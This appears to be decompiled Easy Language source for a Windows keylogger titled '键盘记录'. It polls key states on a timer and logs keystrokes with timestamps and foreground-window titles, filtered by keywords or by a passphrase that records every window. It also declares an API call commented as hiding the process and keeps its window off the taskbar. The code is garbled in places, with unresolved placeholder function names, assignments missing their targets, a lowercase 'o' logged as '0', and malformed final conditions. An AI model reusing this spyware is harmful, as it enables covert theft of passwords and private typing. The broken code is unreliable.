 ' 文件类型：Windows窗口程序

 ' 程序名称：
 ' 程序描述：
 ' 程序作者：
 ' 邮政编码：
 ' 联系地址：
 ' 联系电话：
 ' 传真号码：
 ' 电子信箱：
 ' 主页地址：
 ' 版权声明：
 ' 版本号：1.0
 ' 创建号：0.0


 ' 所需要的支持库：
 ' krnln d09f2340818511d396f6aaf844c7e325 2 0 系统核心支持库



窗口 _启动窗口 ' 在程序启动后自动调入本窗口
    左边 = 50
    顶边 = 50
    宽度 = 394
    高度 = 295
    鼠标指针 = { 0,0,0,0 }
    标记 = “”
    可视 = 真
    禁止 = 假
    边框 = 2
    底图方式 = 1
    底色 = -16777216 '  0xFF000000
    最大化按钮 = 假
    最小化按钮 = 假
    控制按钮 = 真
    位置 = 1
    可否移动 = 真
    背景音乐播放次数 = 0
    回车下移焦点 = 假
    Esc键关闭 = 真
    F1键打开帮助 = 假
    帮助标志值 = 0
    在任务栏中显示 = 假
    随意移动 = 假
    外形 = 0
    总在最前 = 假
    保持标题栏激活 = 假
    图标 =  ' 空
    背景音乐 =  ' 空
    标题 = “键盘记录”
    帮助文件名 = “”

窗口 背景窗口
    左边 = 50
    顶边 = 50
    宽度 = 368
    高度 = 191
    鼠标指针 = { 0,0,0,0 }
    标记 = “”
    可视 = 真
    禁止 = 假
    边框 = 0
    底图方式 = 1
    底色 = -16777216 '  0xFF000000
    最大化按钮 = 假
    最小化按钮 = 假
    控制按钮 = 真
    位置 = 1
    可否移动 = 真
    背景音乐播放次数 = 0
    回车下移焦点 = 假
    Esc键关闭 = 真
    F1键打开帮助 = 假
    帮助标志值 = 0
    在任务栏中显示 = 真
    随意移动 = 假
    外形 = 0
    总在最前 = 假
    保持标题栏激活 = 真
    图标 =  ' 空
    背景音乐 =  ' 空
    标题 = “”
    帮助文件名 = “”



.图片 readme, " ' 已保存到：D:\易语言学习\Data\键盘记录.e\readme", , 


.全局变量 记录文本, 文本型, , , 
.全局变量 特征词, 文本型, , , 

.DLL命令 取前台窗口句柄, 整数型, "", "GetForegroundWindow", , 

.DLL命令 窗口类名, 整数型, "", "GetClassNameA", , 
    .参数 hwnd, 整数型, , 
    .参数 lpClassName, 文本型, , 
    .参数 nMaxCount, 整数型, , 

.DLL命令 窗体标题, 整数型, "", "GetWindowTextA", , 
    .参数 hwnd, 整数型, , 
    .参数 lpString, 文本型, , 
    .参数 cch, 整数型, , 

.DLL命令 标题长度, 整数型, "", "GetWindowTextLengthA", , 
    .参数 hwnd, 整数型, , 

.DLL命令 取键状态, 整数型, "", "GetAsyncKeyState", , 
    .参数 vKey, 整数型, , 

.DLL命令 取当前进程, 整数型, "", "GetCurrentProcessId", , 

.DLL命令 注册进程, 整数型, "", "RegisterServiceProcess", , 
    .参数 dwProcessID, 整数型, , 
    .参数 dwType, 整数型, , 为1时为显示，为0时为隐藏进程

.DLL命令 设置透明, 整数型, "", "SetLayeredWindowAttributes", , 
    .参数 hwnd, 整数型, , 
    .参数 crkey, 整数型, , 
    .参数 alpha, 字节型, , 
    .参数 dwflags, 整数型, , 

.DLL命令 取窗口风格, 整数型, "", "GetWindowLongA", , 
    .参数 hwnd, 整数型, , 
    .参数 nIndex, 整数型, , 

.DLL命令 置窗口风格, 整数型, "", "SetWindowLongA", , 
    .参数 hwnd, 整数型, , 
    .参数 nindex, 整数型, , 
    .参数 hnew, 整数型, , 

.DLL命令 GetDC, 整数型, "user32.dll", "GetDC", , 
    .参数 hnd, 整数型, , 

.DLL命令 DelDC, 整数型, "user32.dll", "ReleaseDC", , 
    .参数 hnd, 整数型, , 
    .参数 hdc, 整数型, , 

.DLL命令 取功能键状态, 整数型, "", "GetKeyState", , 
    .参数 nVirtKey, 空白型, , 

.窗口程序集 窗口程序集1, , , 

.子程序 __启动窗口_创建完毕, 空白型, , 
载入 (背景窗口, _启动窗口, 假) ' 载入背景窗口作为编辑框的背景。背景窗口为半透明窗口。
赋值 (., 取字节集数据 (#readme, 10)) ' 填入编辑框内容。

.子程序 检查窗口, 逻辑型, , 检查前台窗口是否是准备监视的窗口，如果是返回真，反之则否。
.参数 窗口句柄, 整数型, , 前台窗口句柄。

.局部变量 数组, 文本型, , "1", 
.局部变量 容器, 整数型, , , 
.局部变量 前台窗口标题, 文本型, , , 

.如果 (等于 (特征词, “我爱易语言”)) ' 如果特征词为“我爱易语言”，则记录所有窗口。
    返回 (真)
.否则
    
.如果结束
复制数组 (数组, 分割文本 (特征词, “;”, ))
.如果真 (等于 (取数组成员数 (数组), 0))
    返回 (假)
.如果真结束
赋值 (前台窗口标题, 窗口名 (取前台窗口句柄 ()))
.计次循环首 (取数组成员数 (数组), 容器)
    .如果 (不等于 (寻找文本 (前台窗口标题, 数组 [容器], , 假), -1))
        返回 (真)
    .否则
        
    .如果结束
    
.计次循环尾 ()
返回 (假)


.子程序 窗口单元名, 文本型, , 
.参数 Hwnd, 整数型, , 

.局部变量 名, 文本型, , , 
.局部变量 长, 整数型, , , 

赋值 (名, 取空白文本 (80))
赋值 (长, 未知函数_167837746 (Hwnd, 名, 80))
返回 (取文本左边 (名, 长))

.子程序 窗口名, 文本型, , 
.参数 句柄, 整数型, , 

.局部变量 长, 整数型, , , 
.局部变量 名, 文本型, , , 

赋值 (长, 未知函数_167837751 (句柄))
.如果真 (小于或等于 (长, 0))
    返回 (“”)
.如果真结束
赋值 (名, 取空白文本 (长))
赋值 (长, 未知函数_167837752 (句柄, 名, 相加 (长, 1)))
返回 (名)

.子程序 是否大写, 逻辑型, , 检查CAPSLOCK键是否被按下，是返回真
.局部变量 binit, 逻辑型, 静态, , 
.局部变量 bon, 逻辑型, 静态, , 

.如果 (等于 (binit, 假))
    .判断循环首 (不等于 (未知函数_167837756 (20), 0))
    .判断循环尾 ()
    赋值 (bon, 选择 (不等于 (未知函数_167837757 (20), 0), 真, 假))
    赋值 (binit, 真)
.否则
    .如果真 (不等于 (未知函数_167837756 (20), 0))
        .判断循环首 (不等于 (未知函数_167837756 (20), 0))
        .判断循环尾 ()
        赋值 (bon, 取反 (bon))
    .如果真结束
    
.如果结束
返回 (bon)

.子程序 _按键记录时钟_周期事件, 空白型, , 
.局部变量 当前窗口, 整数型, 静态, , 
.局部变量 当前窗口标题, 文本型, 静态, , 
.局部变量 是否可记录, 逻辑型, , , 
.局部变量 keystate, 整数型, , , 
.局部变量 shift, 逻辑型, , , 

赋值 (shift, 选择 (不等于 (未知函数_167837765 (16), 0), 真, 假)) ' 检查SHIFT键是否被按下。
赋值 (是否可记录, 未知函数_67174472 (未知函数_167837766 ()))
.如果 (不等于 (当前窗口, 未知函数_167837766 ()))
    赋值 (当前窗口, 未知函数_167837766 ())
    赋值 (当前窗口标题, 未知函数_67174471 (未知函数_167837766 ()))
    .如果真 (是否可记录)
        赋值 (记录文本, 相加 (记录文本, #换行符, “=======”, #换行符, “[记录开始时间]：”, 时间到文本 (取现行时间 (), ), #换行符, “[目标窗口标题]：”, 窗口名 (取前台窗口句柄 ()), #换行符, “[键盘记录内容]：”))
    .如果真结束
    
.否则
    .如果真 (不等于 (当前窗口标题, 未知函数_67174471 (未知函数_167837766 ())))
        赋值 (当前窗口标题, 未知函数_67174471 (未知函数_167837766 ()))
        .如果真 (是否可记录)
            赋值 (相加 (#换行符, “=======”, #换行符, 时间到文本 (取现行时间 (), ), #换行符, 未知函数_67174471 (未知函数_167837766 ()), #换行符))
        .如果真结束
        
    .如果真结束
    
.如果结束
 ' 以下为记录键盘输入的程序，可记录大部分按键，其它的可自行加入。
.如果真 (并且 (是否可记录, 不等于 (位与 (未知函数_167837765 (8), 1), 0)))
    赋值 (相加 (“退格”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (未知函数_167837765 (9), 1), 0)))
    赋值 (相加 (“换行”, #换行符))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (未知函数_167837765 (37), 1), 0)))
    赋值 (相加 (“←”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (未知函数_167837765 (39), 1), 0)))
    赋值 (相加 (“→”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (未知函数_167837765 (46), 1), 0)))
    赋值 (相加 (“删除”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (65))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“A”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“a”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (66))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“B”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“b”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (67))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“C”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“c”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (68))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“D”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“d”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (69))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“E”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“e”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (70))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“F”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“f”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (71))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“G”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“g”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (72))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“H”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“h”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (73))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“I”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“i”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (74))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“J”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“j”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (75))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“K”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“k”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (76))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“L”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“l”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (77))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“M”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“m”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (78))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“N”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“n”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (79))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“O”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“0”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (80))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“P”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“p”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (81))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“Q”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“q”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (82))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“R”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“r”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (83))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“S”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“s”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (84))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“T”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“t”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (85))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“U”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“u”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (86))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“V”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“v”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (87))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“W”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“w”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (88))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“X”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“x”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (89))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“Y”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“y”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (90))
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 未知函数_67174473 (), 不等于 (shift, 真)), 并且 (是否可记录, 等于 (未知函数_67174473 (), 假), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“Z”))
.如果真结束
.如果真 (或者 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (未知函数_67174473 (), 假), 不等于 (shift, 真)), 并且 (是否可记录, 未知函数_67174473 (), 不等于 (位与 (keystate, 1), 0), shift)))
    赋值 (相加 (“z”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (49))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 不等于 (shift, 真)))
    赋值 (相加 (“1”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (shift, 真)))
    赋值 (相加 (“!”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (48))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 不等于 (shift, 真)))
    赋值 (相加 (“0”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (shift, 真)))
    赋值 (相加 (“)”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (50))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 不等于 (shift, 真)))
    赋值 (相加 (“2”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (shift, 真)))
    赋值 (相加 (“@”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (51))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 不等于 (shift, 真)))
    赋值 (相加 (“3”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (shift, 真)))
    赋值 (相加 (“#”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (52))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 不等于 (shift, 真)))
    赋值 (相加 (“4”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (shift, 真)))
    赋值 (相加 (“$”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (53))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 不等于 (shift, 真)))
    赋值 (相加 (“5”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (shift, 真)))
    赋值 (相加 (“%”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (54))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 不等于 (shift, 真)))
    赋值 (相加 (“6”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (shift, 真)))
    赋值 (相加 (“^”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (55))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 不等于 (shift, 真)))
    赋值 (相加 (“7”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (shift, 真)))
    赋值 (相加 (“&”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (56))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 不等于 (shift, 真)))
    赋值 (相加 (“8”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (shift, 真)))
    赋值 (相加 (“*”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (57))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 不等于 (shift, 真)))
    赋值 (相加 (“9”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (shift, 真)))
    赋值 (相加 (“(”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (186))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 不等于 (shift, 真)))
    赋值 (相加 (“;”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (shift, 真)))
    赋值 (相加 (“:”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (187))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 不等于 (shift, 真)))
    赋值 (相加 (“=”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (shift, 真)))
    赋值 (相加 (“+”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (188))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 不等于 (shift, 真)))
    赋值 (相加 (“,”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (shift, 真)))
    赋值 (相加 (“<”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (189))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 不等于 (shift, 真)))
    赋值 (相加 (“-”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (shift, 真)))
    赋值 (相加 (“_”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (190))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 不等于 (shift, 真)))
    赋值 (相加 (“.”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (shift, 真)))
    赋值 (相加 (“>”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (191))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 不等于 (shift, 真)))
    赋值 (相加 (“/”))
.如果真结束
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0), 等于 (shift, 真)))
    赋值 (相加 (“?”))
    
.如果真结束
赋值 (keystate, 未知函数_167837765 (192))
.如果真 (并且 (不等于 (位与 (1), 0), 不等于 (真)))
    赋值 (相加 (“`”))
.如果真结束
.如果真 (并且 (不等于 (位与 (1), 0), 等于 (真)))
    赋值 (相加 (“~”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (219))
.如果真 (并且 (不等于 (位与 (1), 0), 不等于 (真)))
    赋值 (相加 (“[”))
.如果真结束
